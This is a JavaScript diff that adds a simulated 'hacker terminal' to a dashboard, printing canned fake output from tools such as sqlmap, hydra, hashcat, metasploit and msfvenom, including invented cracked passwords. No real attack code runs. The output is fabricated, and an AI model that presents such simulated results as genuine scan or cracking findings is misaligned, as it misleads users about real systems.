+                    this.appendLine(`${d.padEnd(20)} (Status: ${s})`);
+                }
+                this.appendLines([
+                    '===============================================================',
+                    'Finished',
+                    '==============================================================='
+                ]);
+            }
+
+            async simFfuf(t) {
+                this.appendLines([
+                    "        /'___\\  /'___\\           /'___\\",
+                    "       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/",
+                    "       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\",
+                    "        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/",
+                    "         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\",
+                    "          \\/_/    \\/_/   \\/___/    \\/_/",
+                    '',
+                    ':: Method           : GET',
+                    `:: URL              : http://${t}/FUZZ`,
+                    ':: Follow redirects : false',
+                    ':: Calibration      : false',
+                    ':: Timeout          : 10',
+                    ':: Threads          : 40',
+                    ':: Matcher          : Response status: 200,301,403',
+                    '________________________________________________'
+                ]);
+                await Utils.delay(300);
+                this.appendLines([
+                    'admin                   [Status: 301, Size: 178, Words: 6]',
+                    'api                     [Status: 200, Size: 2340, Words: 112]',
+                    'backup                  [Status: 403, Size: 278, Words: 20]',
+                    'login                   [Status: 200, Size: 4521, Words: 310]',
+                    'server-status           [Status: 403, Size: 278, Words: 20]',
+                    ':: Progress: [22000/22000] :: Job [1/1] :: 412 req/sec :: Duration: [0:00:54] :: Errors: 0 ::'
+                ]);
+            }
+
+            async simNikto(t) {
+                this.appendLines([
+                    '- Nikto v2.5.0',
+                    '---------------------------------------------------------------------------',
+                    `+ Target IP:          ${t}`,
+                    `+ Target Hostname:    ${t}`,
+                    '+ Target Port:        80',
+                    `+ Start Time:         ${new Date().toUTCString()}`,
+                    '---------------------------------------------------------------------------',
+                    '+ Server: Apache/2.4.52 (Ubuntu)',
+                    '+ /: The anti-clickjacking X-Frame-Options header is not present.',
+                    '+ /: The X-Content-Type-Options header is not set.',
+                    "+ No CGI Directories found (use '-C all' to force check all possible dirs)",
+                    '+ /icons/README: Apache default file found.',
+                    '+ /admin/: Admin login page/dashboard found.',
+                    '+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host',
+                    `+ End Time:           ${new Date().toUTCString()} (12 seconds)`,
+                    '---------------------------------------------------------------------------',
+                    '+ 1 host(s) tested'
+                ]);
+            }
+
+            async simWhatweb(t) {
+                this.appendLine(`http://${t} [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[${t}], PHP[8.1.2], Title[Welcome], X-Powered-By[PHP/8.1.2]`);
+            }
+
+            async simWafw00f(t) {
+                this.appendLines([
+                    '                 ______',
+                    '                /      \\',
+                    '               (  W00f! )',
+                    '                \\  ____/',
+                    '                ,,    __            404 Hack Not Found',
+                    '',
+                    `[*] Checking http://${t}`,
+                    `[+] The site http://${t} is behind Cloudflare (Cloudflare Inc.) WAF.`,
+                    '[~] Number of requests: 7'
+                ]);
+            }
+
+            async simSqlmap(t) {
+                this.appendLines([
+                    '        ___',
+                    '       __H__',
+                    " ___ ___[']_____ ___ ___  {1.8.3#stable}",
+                    "|_ -| . [.]     | .'| . |",
+                    '|___|_  [,]_|_|_|__,|  _|',
+                    '      |_|V...       |_|   https://sqlmap.org',
+                    '',
+                    "[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program",
+                    `[*] starting at ${Utils.getLocalTimeString()}`,
+                    ''
+                ]);
+                await Utils.delay(350);
+                this.appendLine(`[${Utils.getLocalTimeString()}] [INFO] testing connection to the target URL`);
+                await Utils.delay(400);
+                this.appendLine(`[${Utils.getLocalTimeString()}] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'`);
+                await Utils.delay(450);
+                this.appendLine(`[${Utils.getLocalTimeString()}] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'`);
+                await Utils.delay(400);
+                this.appendLines([
+                    `[${Utils.getLocalTimeString()}] [CRITICAL] GET parameter 'q' appears to be vulnerable to SQL injection attacks`,
+                    '[*] target URL appears to be vulnerable',
+                    ''
+                ]);
+            }
+
+            async simHydra(t) {
+                this.appendLines([
+                    'Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).',
+                    '[DATA] max 16 tasks per 1 run (could change with -T)',
+                    `[DATA] attacking http-post-form://${t}:80/login.php`
+                ]);
+                await Utils.delay(500);
+                this.appendLine('[STATUS] 45.00 tries/min, 45 tries done');
+                await Utils.delay(400);
+                this.appendLine('[STATUS] 48.00 tries/min, 98 tries done');
+                await Utils.delay(550);
+                this.appendLines([
+                    `[*] [HTTP-POST-FORM] host: ${t}   login: admin   password: password123`,
+                    `<span class="term-success">[+] [HTTP-POST-FORM] host: ${t} - login: admin - password: password123 - valid!</span>`,
+                    `[STATUS] attack finished for ${t} (valid pair found)`,
+                    '1 of 1 target successfully completed, 1 valid password found'
+                ]);
+            }
+
+            async simHydraSsh(t) {
+                this.appendLines([
+                    'Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak',
+                    '[DATA] max 16 tasks per 1 run, attack timeout 16s',
+                    `[DATA] attacking ssh://${t}:22/`
+                ]);
+                await Utils.delay(500);
+                this.appendLine('[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14329936 to do in 3726:33h');
+                await Utils.delay(600);
+                this.appendLines([
+                    `[22][ssh] host: ${t}   login: admin   password: admin123`,
+                    '1 of 1 target successfully completed, 1 valid password found'
+                ]);
+            }
+
+            async simMedusa(t) {
+                this.appendLines([
+                    'Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks',
+                    `ACCOUNT FOUND: [ssh] Host: ${t} User: admin Password: Summer2024! [SUCCESS]`
+                ]);
+            }
+
+            async simJohn(t) {
+                this.appendLines([
+                    'Using default input encoding: UTF-8',
+                    'Loaded 3 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])',
+                    'Will run 8 OpenMP threads',
+                    "Press 'q' or Ctrl-C to abort, almost any other key for status"
+                ]);
+                await Utils.delay(500);
+                this.appendLines([
+                    'password123      (admin)',
+                    'letmein          (jdoe)',
+                    '2g 0:00:00:02 DONE (2026-07-30) 0.91g/s 12544p/s 12544c/s 37632C/s',
+                    'Use the "--show" option to display all of the cracked passwords reliably'
+                ]);
+            }
+
+            async simHashcat(t) {
+                this.appendLines([
+                    'hashcat (v6.2.6) starting...',
+                    '',
+                    'OpenCL API (OpenCL 3.0) - Platform #1 [NVIDIA]',
+                    '* Device #1: NVIDIA GeForce RTX 3080, 8960/10240 MB, 68MCU',
+                    '',
+                    'Minimum password length supported by kernel: 0',
+                    'Maximum password length supported by kernel: 256'
+                ]);
+                await Utils.delay(400);
+                this.appendLines([
+                    '5f4dcc3b5aa765d61d8327deb882cf99:password',
+                    'e10adc3949ba59abbe56e057f20f883e:123456',
+                    'Approaching final keyspace - waiting for remaining jobs to finish, Processed: 14344384',
+                    'Started: Thu Jul 30 11:30:01 2026',
+                    'Stopped: Thu Jul 30 11:30:14 2026'
+                ]);
+            }
+
+            async simNc(t) {
+                for (const p of ['22', '80', '443', '3306', '8080', '9000']) {
+                    await Utils.delay(140);
+                    if (p !== '9000') {
+                        this.appendLine(`Connection to ${t} ${p} port [tcp/*] succeeded!`);
+                    } else {
+                        this.appendLine(`Connection to ${t} ${p} port [tcp/*] failed: Connection refused`);
+                    }
+                }
+            }
+
+            async simTcpdump(t) {
+                this.appendLines([
+                    'tcpdump: verbose output suppressed, use -v or -vv for full protocol decode',
+                    'listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes'
+                ]);
+                await Utils.delay(300);
+                const now = Utils.getLocalTimeString();
+                for (let i = 0; i < 5; i++) {
+                    await Utils.delay(280 + Math.random() * 300);
+                    const src = Utils.generateRandomIP();
+                    const sport = Math.floor(Utils.randomInRange(40000, 65000));
+                    const dport = [80, 443, 22, 3306][Math.floor(Math.random() * 4)];
+                    this.appendLine(`${now}.${String(Math.floor(Math.random() * 999999)).padStart(6, '0')} IP ${src}.${sport} > ${t}.${dport}: Flags [S], seq ${Math.floor(Math.random() * 2e9)}`);
+                }
+                this.appendLines([
+                    '^C',
+                    '5 packets captured',
+                    '5 packets received by filter',
+                    '0 packets dropped by kernel'
+                ]);
+            }
+
+            async simTshark(t) {
+                this.appendLine("Capturing on 'eth0'");
+                await Utils.delay(300);
+                for (let i = 1; i <= 5; i++) {
+                    this.appendLine(`    ${i} 0.${String(i * 123456).padStart(6, '0')} ${Utils.generateRandomIP()} → ${t} HTTP GET / HTTP/1.1`);
+                    await Utils.delay(180);
+                }
+                this.appendLine('5 packets captured');
+            }
+
+            async simOpenssl(t) {
+                this.appendLine('CONNECTED(00000003)');
+                await Utils.delay(250);
+                this.appendLines([
+                    'depth=2 C = US, O = DigiCert Inc, CN = DigiCert Global Root CA',
+                    'verify return:1',
+                    'depth=1 C = US, O = DigiCert Inc, CN = DigiCert SHA2 Secure Server CA',
+                    'verify return:1',
+                    `depth=0 CN = ${t}`,
+                    'verify return:1',
+                    '---',
+                    `subject=CN = ${t}`,
+                    'issuer=C = US, O = DigiCert Inc, CN = DigiCert SHA2 Secure Server CA',
+                    '---',
+                    'notBefore=Jan 15 00:00:00 2025 GMT',
+                    'notAfter=Jan 15 23:59:59 2027 GMT',
+                    '---',
+                    'New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384'
+                ]);
+            }
+
+            async simPing(t) {
+                this.appendLine(`PING ${t} (${t}) 56(84) bytes of data.`);
+                for (let i = 1; i <= 4; i++) {
+                    await Utils.delay(350);
+                    const time = (Math.random() * 20 + 5).toFixed(1);
+                    this.appendLine(`64 bytes from ${t}: icmp_seq=${i} ttl=64 time=${time} ms`);
+                }
+                this.appendLines([
+                    '',
+                    `--- ${t} ping statistics ---`,
+                    '4 packets transmitted, 4 received, 0% packet loss, time 3003ms',
+                    'rtt min/avg/max/mdev = 5.1/12.3/24.0/6.8 ms'
+                ]);
+            }
+
+            async simTraceroute(t) {
+                this.appendLines([
+                    `traceroute to ${t} (${t}), 30 hops max, 60 byte packets`,
+                    ' 1  10.0.0.1  0.412 ms  0.388 ms  0.371 ms',
+                    ' 2  10.10.0.1  1.204 ms  1.188 ms  1.165 ms',
+                    ` 3  ${t}  2.015 ms  1.992 ms  1.978 ms`
+                ]);
+            }
+
+            async simEnum4linux(t) {
+                this.appendLines([
+                    'Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ )',
+                    ' =========================================( Target Information )=========================================',
+                    `Target ........... ${t}`,
+                    'RID Range ........ 500-550,1000-1050',
+                    "Username ......... ''",
+                    "Password ......... ''",
+                    ' ==============================( Getting domain SID via RPC )==============================',
+                    'Domain Name: WORKGROUP',
+                    'Domain Sid: (NULL SID)',
+                    '[+] Got domain SID',
+                    ` ==============================( Users on ${t} via RID cycling )==============================`,
+                    ' * administrator (Local User)',
+                    ' * guest (Local User)',
+                    ' * bob (Local User)'
+                ]);
+            }
+
+            async simSmbclient(t) {
+                this.appendLines([
+                    '',
+                    '\tSharename       Type      Comment',
+                    '\t---------       ----      -------',
+                    '\tADMIN$          Disk      Remote Admin',
+                    '\tC$              Disk      Default share',
+                    '\tIPC$            IPC       Remote IPC',
+                    '\tPublic          Disk',
+                    'SMB1 disabled -- no workgroup available'
+                ]);
+            }
+
+            async simRpcclient(t) {
+                this.appendLines([
+                    'rpcclient $> querydominfo',
+                    'Domain:        WORKGROUP',
+                    'Server:        TARGET-PC',
+                    'Comment:',
+                    'Total Users:   12',
+                    'Total Groups:  5'
+                ]);
+            }
+
+            async simCme(t) {
+                this.appendLines([
+                    `SMB         ${t}    445    TARGET-PC   [*] Windows 10 Pro 19045 x64 (name:TARGET-PC) (domain:WORKGROUP) (signing:False) (SMBv1:False)`,
+                    `SMB         ${t}    445    TARGET-PC   [+] WORKGROUP\\admin:Password123!`
+                ]);
+            }
+
+            async startMsf(t) {
+                this.appendLine('[*] Starting the Metasploit Framework console...');
+                await Utils.delay(700);
+                this.appendLines([
+                    '[*] ',
+                    '',
+                    '       =[ metasploit v6.4.12-dev                          ]',
+                    '+ -- --=[ 2461 exploits - 1263 auxiliary - 423 post       ]',
+                    '+ -- --=[ 1465 payloads - 49 encoders - 11 nops           ]',
+                    '+ -- --=[ 9 evasion                                       ]',
+                    '',
+                    'Metasploit tip: Use the search command to find modules.',
+                    ''
+                ]);
+                this.msfMode = true;
+                this.msfModule = null;
+                this.setPrompt(true);
+            }
+
+            async simMsfSearch(t) {
+                this.appendLines([
+                    '[*] exec: search smb_version',
+                    '',
+                    'Matching Modules',
+                    '================',
+                    '',
+                    '   #  Name                               Disclosure Date  Rank    Check  Description',
+                    '   -  ----                               ---------------  ----    -----  -----------',
+                    '   0  auxiliary/scanner/smb/smb_version                    normal  Yes    SMB Version Detection',
+                    '   1  exploit/windows/smb/ms17_010_eternalblue  2017-03-14  average Yes    MS17-010 EternalBlue SMB'
+                ]);
+            }
+
+            async simMsfUse(t) {
+                this.msfModule = 'smb_version';
+                this.setPrompt(true, 'smb_version');
+                this.appendLine('[*] Using configured module: auxiliary/scanner/smb/smb_version');
+            }
+
+            async simMsfSet(t) {
+                this.appendLine(`RHOSTS => ${t}`);
+            }
+
+            async simMsfRun(t) {
+                this.appendLine(`[*] ${t}:445 - Host is running Windows 10 (build 19045)`);
+                await Utils.delay(350);
+                this.appendLine(`[*] ${Utils.generateRandomIP()}:445 - Host is running Windows Server 2019`);
+                await Utils.delay(250);
+                this.appendLine('[+] Scan completed');
+            }
+
+            async simMsfExit(t) {
+                this.msfMode = false;
+                this.msfModule = null;
+                this.setPrompt(false);
+                this.appendLine('[*] Exiting Metasploit console');
+            }
+
+            async simSearchsploit(t) {
+                this.appendLines([
+                    '---------------------------------------------- ---------------------------------',
+                    ' Exploit Title                                |  Path',
+                    '---------------------------------------------- ---------------------------------',
+                    'Apache 2.4.49 - Path Traversal & RCE (2)       | cgi/webapps/50383.sh',
+                    'Apache HTTP Server 2.4.50 - Path Traversal     | windows/webapps/50406.py',
+                    'Apache 2.4.x - Buffer Overflow                 | linux/remote/47071.c',
+                    '---------------------------------------------- ---------------------------------',
+                    'Shellcodes: No Results'
+                ]);
+            }
+
+            async simMsfvenom(t) {
+                this.appendLines([
+                    '[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload',
+                    '[-] No arch selected, selecting arch: x64 from the payload',
+                    'No encoder specified, outputting raw payload',
+                    'Payload size: 130 bytes',
+                    'Final size of elf file: 250 bytes',
+                    'Saved as: /tmp/shell.elf'
+                ]);
             }
         }
 
         class DashboardApp {
             static bootstrap() {
                 lucide.createIcons();
-
                 new SystemHeader();
                 new SystemMetrics();
-                
                 setTimeout(() => {
                     new TelemetryChart('telemetryChart');
                 }, 0);
-                
-                new TerminalConsole('terminal-log-container');
+                new TerminalConsole();
             }
         }
 
